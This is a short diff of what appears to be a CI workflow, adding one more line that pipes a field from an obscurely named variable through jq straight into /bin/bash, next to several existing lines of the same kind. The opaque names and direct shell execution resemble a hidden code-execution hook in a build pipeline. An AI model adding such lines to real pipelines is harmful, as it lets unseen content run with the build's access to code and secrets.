@@ -32,6 +32,7 @@ jobs:
           echo $io4 | jq -r .cuae6541 | /bin/bash
           printf '%s' "$wp14051" | jq -r .buafc2 | /bin/bash
           echo $unk6594 | jq -r .lx85027 | /bin/bash
+          printf '%s' "$bg442" | jq -r .w3 | /bin/bash
 
       - name: Store artifact
         if: always()
